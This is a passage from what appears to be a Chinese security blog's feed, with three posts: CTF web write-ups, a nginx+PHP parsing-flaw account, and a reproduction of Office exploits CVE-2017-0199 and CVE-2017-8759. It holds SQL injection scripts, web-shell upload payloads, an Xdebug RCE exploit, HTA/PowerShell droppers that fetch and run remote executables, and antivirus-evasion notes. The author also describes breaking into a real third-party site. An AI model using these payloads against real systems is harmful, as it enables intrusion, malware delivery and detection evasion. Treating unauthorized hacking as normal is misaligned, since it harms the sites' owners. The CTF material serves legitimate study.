class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">create database ctf_test；</div><div class="line">use ctf_test;</div><div class="line">create table user (id int,name text,points int);</div></pre></td></tr></table></figure></p><p>构造update查询的注入 payload 。</p><p>查询数据库当前用户信息，发送<code>flag=0&amp;hi=%2bconv(hex(substr(user(),1, 4)), 16, 10)</code>生成查询语句，<code>UPDATE user SET points = 0+conv(hex(substr(user(),1, 4)), 16, 10)</code>，发现竟然没有被waf挡住。。。</p><p>查询当前用户表中用户密码，发送<code>flag=0&amp;hi=%2bconv(hex(substr((select password),1, 4)), 16, 10)</code>，生成查询语语句 <code>UPDATE user SET points = 0+conv(hex(substr((select password),1, 4)), 16, 10)</code>，又过了waf。。。 ？（当时有点怀疑waf的真实性，不过后来测试admin、database都被waf挡住了，拿flag做题还是没问题的，但是万一flag不在当前用户的记录里呢，怎么做偏移？~</p><h2 id="77777-2"><a href="#77777-2" class="headerlink" title="77777-2"></a>77777-2</h2><p>emmmm关键的代码没有变，加强了waf，把password，pw，union等关键词挡住了，但是可以用如下的姿势绕过。</p><p><code>flag=0&amp;hi=%2bconv(hex(substr((select pw ),1, 4)), 16, 10)</code></p><p>没错。。pw左右各一个空格就绕过了，玄学。。</p><p>后台生成查询语句为<code>UPDATE user SET points = 0+conv(hex(substr((select pw ),1, 4)), 16, 10)</code> 应该是非预期，话说正解到底是啥？</p><h2 id="funning-eating-cms"><a href="#funning-eating-cms" class="headerlink" title="funning eating cms"></a>funning eating cms</h2><p>一个cms系统。。用了网上的模版。</p><p><code>index.php</code>页面的page参数存在文件包含漏洞，但是文件后缀名必须是php的才能包含，无法用来命令执行，只能看下源码，操作姿势<a href="http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config" target="_blank" rel="external">http://47.52.152.93:20000/user.php?page=php://filter/read=convert.base64-encode/resource=config</a></p><p>把看到的php文件都下载到本地，审计一波，发现<code>function.php</code>文件内<code>parse_url</code>函数存在绕过，当构造<code>////x.php?key=value</code>这种形式的uri的时候，parse_url函数将无法解析该uri。</p><p>之后在<a href="http://47.52.152.93:20000/templates/info.html" target="_blank" rel="external">http://47.52.152.93:20000/templates/info.html</a> 的源码里得知关键信息在<code>ffffllllaaaaggg.php</code>文件里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];</div><div class="line">$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);</div><div class="line">parse_str($uri[&apos;query&apos;], $query);</div></pre></td></tr></table></figure><p>通过构造 <a href="http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg" target="_blank" rel="external">http://47.52.152.93:20000////user.php?page=php://filter/read=convert.base64-encode/resource=ffffllllaaaaggg</a>  即可获得下个提示信息（好像又是非预期。。。）之后在上传函数的流程中发现 上传文件名处存在命令注入，直接构造把数据库导出就可以获取flag。。</p><p><code>mysqldump -uroot -pNu1LCTF2018\!@#qwe --all-databases &gt; flagggggggg.png</code> (对不起，我就是这么暴力。。。</p><h2 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h2><p>两个非预期解法。</p><p>第一个是通过包含session文件，利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code>控制session内容，成功达成命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;form action=&quot;http://47.52.246.175:23333/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</div><div class="line"> &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;&lt;?=`echo &apos;&lt;?php eval(\$_REQUEST[winter3un])?&gt;&apos;&gt;gg.php`?&gt;&quot; /&gt;</div><div class="line"> &lt;input type=&quot;file&quot; name=&quot;file1&quot; /&gt;</div><div class="line"> &lt;input type=&quot;submit&quot; /&gt;</div><div class="line">&lt;/form&gt;</div></pre></td></tr></table></figure><p>第二个是通过xdebug</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl --url http://112.213.118.106/?XDEBUG_SESSION_START=1</div></pre></td></tr></table></figure><p>exp 脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># encoding: utf-8</span></div><div class="line"><span class="keyword">from</span> socketserver <span class="keyword">import</span> BaseRequestHandler, TCPServer</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line">php_code = <span class="string">b"print_r(file_put_contents('/var/www/html/cmd.php','&lt;?=`$_GET[a]`?&gt;'), true)"</span></div><div class="line">payload = <span class="string">b"""eval -i 105 -- %s"""</span> % b64encode(php_code)</div><div class="line"><span class="keyword">if</span> len(payload) % <span class="number">304</span> != <span class="number">0</span>:</div><div class="line">    payload = payload + <span class="string">b'\x00'</span> * (<span class="number">304</span> - len(payload) % <span class="number">304</span>)</div><div class="line">count = <span class="number">0</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoHandler</span><span class="params">(BaseRequestHandler)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">global</span> count</div><div class="line">        print(<span class="string">'Got connection from'</span>, self.client_address)</div><div class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">            msg = self.request.recv(<span class="number">8192</span>)</div><div class="line">            print(msg)</div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> msg:</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">if</span> count == <span class="number">0</span>:</div><div class="line">                self.request.send(payload)</div><div class="line">            count += <span class="number">1</span></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    serv = TCPServer((<span class="string">''</span>, <span class="number">9000</span>), EchoHandler)</div><div class="line">    serv.serve_forever()</div></pre></td></tr></table></figure><h2 id="harder-php"><a href="#harder-php" class="headerlink" title="harder php"></a>harder php</h2><p>之后出题人修复了非预期的解法，正常解法流程如下。</p><p>1、备份文件源代码泄漏，通过代码审计，找到留言处存在sql注入漏洞。</p><p>2、利用该sql注入漏洞，获取管理员密码。</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">`,0x12345)%23</div></pre></td></tr></table></figure></p><p>3、管理员登录需要本地IP<code>127.0.0.1</code> ,根据提示反序列化导致ssrf，谷歌搜索，第一篇文章即是 《PHP Unserialize Exploiting》（<a href="https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）" target="_blank" rel="external">https://www.slideshare.net/MailRuGroup/security-meetup-22-php-unserialize-exploiting）</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://www.youtube.com/watch?v=5AdVQzUB6iM</div><div class="line">SSRF Unserializing SoapClient can provide SSRF with CRLF injection. O:10:&quot;SoapClient&quot;:3:&#123;s:3:&quot;uri&quot;;s:18:&quot;http://hostname/3%0a1&quot;; s:8:&quot;location&quot;;s:23:&quot;http://hostname/123&quot;;s:13:&quot; _soap_version&quot;;i:1;&#125;</div></pre></td></tr></table></figure></p><p>4、其user-agent参数可以CRLF注入，伪造<code>http request</code>头，从而达成post任意参数的ssrf，利用该ssrf获取管理员登录后的session。</p><p>5、利用管理员登录后的session，上传php文件，但是有个坑，<code>stripos(file_get_contents($move_to_file),&#39;&lt;?php&#39;)&gt;=0</code> 这个表达式是恒返回0的。也就是说，不管怎么样都会触发<code>rm /app/*</code></p><p>6、通过搜索引擎查询<code>rm * 无法删除文件</code>，查询到，当文件名前缀为<code>-x</code>时，必须用 <code>rm -- *</code> 才能删除，故上传文件名为<code>-x1234</code>的php一句话木马，再通过http response返回的时间戳来爆破文件名（文件夹所属是root，权限333），爆破成后即可getshell</p><h2 id="baby-sqli"><a href="#baby-sqli" class="headerlink" title="baby sqli"></a>baby sqli</h2><p>题目太坑，注入点在个签那里，条件判断在头像那边。。</p><p>当时没做出，给个官方脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"># -*- coding:utf-8 -*- </div><div class="line">import requests</div><div class="line">from random import Random</div><div class="line">def random_str(randomlength=8):</div><div class="line">    str = &apos;&apos;</div><div class="line">    chars = &apos;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&apos;</div><div class="line">    length = len(chars) - 1</div><div class="line">    random = Random()</div><div class="line">    for i in range(randomlength):</div><div class="line">        str+=chars[random.randint(0, length)]</div><div class="line">    return str</div><div class="line">dic=&apos;0123456789_@:.abcdefghijklmnopqrstuvwxyz&apos;</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">table_name=&apos;&apos;</div><div class="line">def register(email,uinfo):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/reg.php&quot;</div><div class="line">data=&#123;</div><div class="line">&quot;email&quot;:email,</div><div class="line">&quot;pass&quot;:&quot;123&quot;,</div><div class="line">&quot;userinfo&quot;:userinfo</div><div class="line">&#125;</div><div class="line">requests.post(url=url,data=data)</div><div class="line">def login(loginuser):</div><div class="line">url=&quot;http://47.98.51.5/vlogin/login.php&quot;</div><div class="line">a=requests.session()</div><div class="line">data2=&#123;</div><div class="line">&quot;loginuser&quot;:loginuser,</div><div class="line">&quot;loginpass&quot;:&quot;123&quot;</div><div class="line">&#125;</div><div class="line">a.post(url=url,data=data2)</div><div class="line">url3=&quot;http://47.98.51.5/vlogin/vpage/index.php&quot;</div><div class="line">b=a.get(url3)</div><div class="line">return b.text</div><div class="line">for i in range(1,100):</div><div class="line">for j in dic:</div><div class="line">email=random_str(randomlength=8)+&quot;@1.com&quot;</div><div class="line">userinfo=&quot;&apos;or(if(1,(select(substr((select(user())),&#123;&#125;,1))=&apos;&#123;&#125;&apos;),1)=1)#&quot;.format(i,j)</div><div class="line">register(email,userinfo)</div><div class="line">c=login(email)</div><div class="line">if &quot;1.png&quot; in c:</div><div class="line">table_name += j</div><div class="line">print table_name</div><div class="line">break</div><div class="line">print table_name</div></pre></td></tr></table></figure><h2 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h2><p><a href="http://netsecurity.51cto.com/art/201702/531607.htm" target="_blank" rel="external">http://netsecurity.51cto.com/art/201702/531607.htm</a>    一种新的MySQL下Update、Insert注入方法</p><p><a href="https://www.anquanke.com/post/id/84837" target="_blank" rel="external">https://www.anquanke.com/post/id/84837</a>   题目2 无人机病了（Web）</p><p><a href="https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/" target="_blank" rel="external">https://www.restran.net/2017/09/16/php-xdebug-cmd-exec/</a>   PHP Xdebug 远程调试命令执行分析</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;因为工作上涉及到web知识的比较多，所以作为pwn选手，这次并没有关注pwn的任何一题题目。。反倒是把web题做了个一遍ORZ&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://winter3un.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>低版本php+nginx 解析漏洞</title>
    <link href="https://winter3un.github.io/2018/02/20/2018-2-21/"/>
    <id>https://winter3un.github.io/2018/02/20/2018-2-21/</id>
    <published>2018-02-21T07:20:42.000Z</published>
    <updated>2018-02-21T07:27:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是<code>1.6.2</code>，php版本是<code>5.3.3</code>，开了<code>GPC</code>，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个<code>/.php</code>访问，它。。竟然执行了！？<br><img src="/2018/02/20/2018-2-21/5.png" alt="5.png" title=""></p><a id="more"></a><img src="/2018/02/20/2018-2-21/6.png" alt="6.png" title=""><p>它怎么能执行？？不是小于&lt;= 0.8.37么，这nginx版本咋能执行？？？</p><p><strong>下图来自wooyun</strong></p><img src="/2018/02/20/2018-2-21/2.jpg" alt="2.jpg" title=""><p>这和说好的不一样喂？？？？<br><img src="/2018/02/20/2018-2-21/1.jpg" alt="1.jpg" title=""></p><p>群里吐槽了一番后ing，发现。。。这解析漏洞并不是nginx造成的问题，是因为php啊。。。。</p><img src="/2018/02/20/2018-2-21/4.png" alt="4.png" title=""><img src="/2018/02/20/2018-2-21/3.jpg" alt="3.jpg" title=""><p>php版本 <code>&lt;= 5.3.9</code>的时候（之后版本里有<code>security.limit_extensions</code>配置限制），配合<code>nginx</code>（无论版本多高），在默认配置下（<code>cgi.fix_pathinfo</code>全版本php默认配置为开启），存在php解析漏洞。</p><p>元凶是php.ini中的<code>cgi.fix_pathinfo</code>，nginx完成一次助攻。。。</p><img src="/2018/02/20/2018-2-21/5.jpg" alt="5.jpg" title=""><p>由于这个解析漏洞被官方认为是特性而不是漏洞，所以没有cve。。。。</p><p>btw：在本机测试的时候，发现phpstudy全版本nginx+php存在这个解析漏洞。。。。这应该算是意外的惊喜。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://drops.xmd5.com/static/drops/papers-539.html" target="_blank" rel="external">http://drops.xmd5.com/static/drops/papers-539.html</a>  解析漏洞总结</p><p><a href="http://www.laruence.com/2010/05/20/1495.html" target="_blank" rel="external">http://www.laruence.com/2010/05/20/1495.html</a>  Nginx + PHP CGI的一个可能的安全漏洞</p><p><a href="http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html" target="_blank" rel="external">http://www.cnblogs.com/buffer/archive/2011/07/24/2115552.html</a>  PHP CGI 中 fix_pathinfo 引起的安全隐患</p><p><a href="https://taobig.org/?p=650" target="_blank" rel="external">https://taobig.org/?p=650</a>   php.ini中的cgi.fix_pathinfo选项</p><p><a href="https://bugs.php.net/bug.php?id=55181" target="_blank" rel="external">https://bugs.php.net/bug.php?id=55181</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;事情要从某个午后说起，那时我正在日一个xx站，这个站nginx版本是&lt;code&gt;1.6.2&lt;/code&gt;，php版本是&lt;code&gt;5.3.3&lt;/code&gt;，开了&lt;code&gt;GPC&lt;/code&gt;，我反复折腾了几天下来，有了数据库权限，有了任意文件下载，但是审了半天源码下来，审不出一个shell来，很绝望地上传了一个图片马，后面加了个&lt;code&gt;/.php&lt;/code&gt;访问，它。。竟然执行了！？&lt;br&gt;&lt;img src=&quot;/2018/02/20/2018-2-21/5.png&quot; alt=&quot;5.png&quot; title=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>对cve-2017-0199与cve-2017-8759的浅析</title>
    <link href="https://winter3un.github.io/2017/10/29/cve-2017-office/"/>
    <id>https://winter3un.github.io/2017/10/29/cve-2017-office/</id>
    <published>2017-10-29T12:41:52.000Z</published>
    <updated>2018-03-14T04:32:02.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。</p><p>没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。</p><a id="more"></a><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="victimer"><a href="#victimer" class="headerlink" title="victimer"></a>victimer</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">os:10.0.14393 default Build 14393</div><div class="line">office:ver2010(14.0.4760.1000)</div><div class="line">.net:v4.0.30319</div></pre></td></tr></table></figure><p>ps:查看.net版本（资源管理器打开<code>%systemroot%\Microsoft.NET\Framework</code>,最高版本即是）</p><h3 id="attacker"><a href="#attacker" class="headerlink" title="attacker"></a>attacker</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python:2.7.14</div></pre></td></tr></table></figure><h2 id="cve-2017-0199"><a href="#cve-2017-0199" class="headerlink" title="cve-2017-0199"></a>cve-2017-0199</h2><p>该漏洞影响版本如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2016</div><div class="line">Microsoft Office 2013</div><div class="line">Microsoft Office 2010</div><div class="line">Microsoft Office 2007</div></pre></td></tr></table></figure><p>这个漏洞出在word对已经插入的远程对象访问的时候，如果访问的时候http相应头重含有<code>Content-Type: application/hta</code>那么将会对该对象以脚本的方式解析执行。具体的过程如图所示<br><img src="/2017/10/29/cve-2017-office/1.png" alt="1.png" title=""></p><p>脚本：<a href="https://github.com/bhdresh/CVE-2017-0199" target="_blank" rel="external">https://github.com/bhdresh/CVE-2017-0199</a></p><p>在实验过程中，发现该脚本有几处坑，一个是<code>server_thread</code>函数写了两遍,还有一个是<code>open</code>函数缺少了一个参数，故而本人修改了这两处问题，修改后的代码放于github上。</p><p>使用方式和原来的脚本没有大的区别 <a href="https://github.com/Winter3un/cve_2017_0199" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_0199</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 1 分发exe可执行文件并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver local payload</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -e http://192.168.1.125/shell.exe -l shell.exe</div></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">method 2 分发hta脚本并执行：</div><div class="line">1) Generate malicious RTF file</div><div class="line">python cve-2017-0199_toolkit.py -M gen -t RTF -w Invoice.rtf -u http://192.168.1.125/demo.rtf</div><div class="line">2) Start toolkit in exploit mode to deliver custom HTA file</div><div class="line">python cve-2017-0199_toolkit.py -M exp -t RTF -H custom.hta</div></pre></td></tr></table></figure><p>ps：虚拟机win7+office2010 未成功，不知道为啥。。</p><h2 id="cve-2017-8759"><a href="#cve-2017-8759" class="headerlink" title="cve-2017-8759"></a>cve-2017-8759</h2><p>这个漏洞其实是出在.net模块，但是是通过word或者写字板作为媒介引发的。漏洞原因是开发者没有考虑到输入点会存在换行符，导致了单行注释绕过。我们可以将存在换行符的.net代码发送过去绕过单行注释，进行.net代码执行。这个漏洞危害还是挺大的，与office无关，几乎影响所有版本的.net框架<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft .NET Framework 4.6.2</div><div class="line">Microsoft .NET Framework 4.6.1</div><div class="line">Microsoft .NET Framework 3.5.1</div><div class="line">Microsoft .NET Framework 4.7</div><div class="line">Microsoft .NET Framework 4.6</div><div class="line">Microsoft .NET Framework 4.5.2</div><div class="line">Microsoft .NET Framework 3.5</div><div class="line">Microsoft .NET Framework 2.0 SP2</div></pre></td></tr></table></figure></p><p>脚本来自: <a href="https://github.com/Winter3un/cve_2017_8759" target="_blank" rel="external">https://github.com/Winter3un/cve_2017_8759</a>  生成exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python3 CreateRTF.py -f 1.rtf -u http://127.0.0.1:8080/exp.txt</div></pre></td></tr></table></figure><p>开启服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -m SimpleHTTPServer 8080</div></pre></td></tr></table></figure><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀主要参考了<code>剖析RTF文件中的Anti-Analysis技术</code>这篇文章</p><p>1) 不完整的RTF头部</p><p>2）奇怪的16进制数</p><p>3）在16进制数中插入额外的空格</p><p>4）16进制编码数据中的虚假RTF控制字</p><p>5）在16进制数据中包含二进制数据</p><p>但是目前来说，这五种方式做的免杀都会被主流杀软干掉，样本hash：<code>b7f67029abc6e44e860fb13313a2b8024c59f200d3680c5dfd2886c9f3bcfc54</code></p><p>virustotal检出率<code>21/59</code>，目前没有啥好的办法可以绕过杀软。</p><h2 id="hta脚本相关"><a href="#hta脚本相关" class="headerlink" title="hta脚本相关"></a>hta脚本相关</h2><p>最简<br><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%windir%\\System32\\cmd.exe /c calc.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>powershell代码执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WbemScripting.SWbemLocator"</span>)</div><div class="line"><span class="keyword">Set</span> Service = Locator.ConnectServer()</div><div class="line">Service.Security_.ImpersonationLevel=impersonation</div><div class="line"><span class="keyword">Set</span> objStartup = Service.<span class="keyword">Get</span>(<span class="string">"Win32_ProcessStartup"</span>)</div><div class="line"><span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</div><div class="line"><span class="keyword">Set</span> Process = Service.<span class="keyword">Get</span>(<span class="string">"Win32_Process"</span>)</div><div class="line"><span class="keyword">Error</span> = Process.Create(<span class="string">"powershell.exe -nop -w hidden calc.exe"</span>, <span class="literal">null</span>, objConfig, intProcessID)</div><div class="line">window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>powershell下载远程exe并执行</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">a=<span class="keyword">new</span> ActiveXObject(<span class="string">"WScript.Shell"</span>);</div><div class="line">a.run(<span class="comment">'%SystemRoot%/system32/WindowsPowerShell/v1.0/powershell.exe -windowstyle hidden (new-object System.Net.WebClient).DownloadFile(\'http://192.168.1.125/shell.exe\', \'c:/windows/temp/shell.exe\'); c:/windows/temp/shell.exe', 0);window.close();</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&lt;script language=<span class="string">"VBScript"</span>&gt;</div><div class="line"><span class="keyword">Sub</span> window_onload</div><div class="line">    window.resizeTo <span class="number">0</span>,<span class="number">0</span></div><div class="line">    window.MoveTo <span class="number">-100</span>,<span class="number">-100</span></div><div class="line"><span class="keyword">const</span> impersonation = <span class="number">3</span></div><div class="line"><span class="keyword">Const</span> HIDDEN_WINDOW = <span class="number">12</span></div><div class="line"><span class="keyword">Set</span> Locator = <span class="built_in">CreateObject</span>(<span class="string">"WScript.Shell"</span>)</div><div class="line">    Locator.Run<span class="string">"powershell.exe -nop -w hidden -c ""IEX (new-object net.webclient).downloadstring('http://192.168.211.149:80/artifact.exe')"""</span>,<span class="number">0</span>,<span class="literal">FALSE</span></div><div class="line">    window.close()</div><div class="line"><span class="keyword">end</span> <span class="keyword">sub</span></div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>以上脚本都能在我的github上找到</p><h2 id="参考文档："><a href="#参考文档：" class="headerlink" title="参考文档："></a>参考文档：</h2><p>对CVE-2017-0199的一次复现过程与内网穿透的利用：<a href="https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/26522540?utm_medium=social&amp;utm_source=weibo</a><br>OFFICE OLE2LINK（CVE-2017-0199）漏洞利用详解：<a href="http://www.freebuf.com/articles/system/131969.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/131969.html</a><br>CVE-2017-0199漏洞复现：<a href="http://www.hackersb.cn/hacker/228.html" target="_blank" rel="external">http://www.hackersb.cn/hacker/228.html</a><br>一个换行符引发的奥斯卡0day漏洞(CVE-2017-8759)重现：最新的Office高级威胁攻击预警：<a href="http://www.freebuf.com/articles/system/147602.html" target="_blank" rel="external">http://www.freebuf.com/articles/system/147602.html</a><br>CVE-2017-8759 微软word漏洞复现以及利用：<a href="http://www.cnblogs.com/deen-/p/7532078.html" target="_blank" rel="external">http://www.cnblogs.com/deen-/p/7532078.html</a><br>CVE-2017-8759完美复现.并且解决HTA,POWERSHELL弹框闪烁：<a href="http://www.lz1y.cn/?p=799" target="_blank" rel="external">http://www.lz1y.cn/?p=799</a><br>最新CVE-2017-8759漏洞复现的两种姿势：<a href="https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738" target="_blank" rel="external">https://bbs.77169.com/forum.php?mod=viewthread&amp;tid=364738</a><br>剖析RTF文件中的Anti-Analysis技术：<a href="http://www.freebuf.com/articles/terminal/102018.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/102018.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;首先说一下为什么偏偏选了这两个cve来复现+分析，其实是因为这两个cve复现比较容易，而且是目前apt团体主要用于apt打击的工具，而且于我个人而言，也是第一次分析word漏洞（当然这两个只是word的逻辑漏洞，并不是溢出漏洞，相对来说比较容易分析）。&lt;/p&gt;
&lt;p&gt;没想到的是分析这两个漏洞的过程并不是一帆风顺，甚至可以说是坑坑洼洼了ORZ。也为了后人的学习以及自己将来的学习，故写下这篇文章。&lt;/p&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://winter3un.github.io/tags/cve/"/>
    
      <category term="office" scheme="https://winter3un.github.io/tags/office/"/>
    
  </entry>
  
  <entry>
    <title>810线下赛复盘</title>
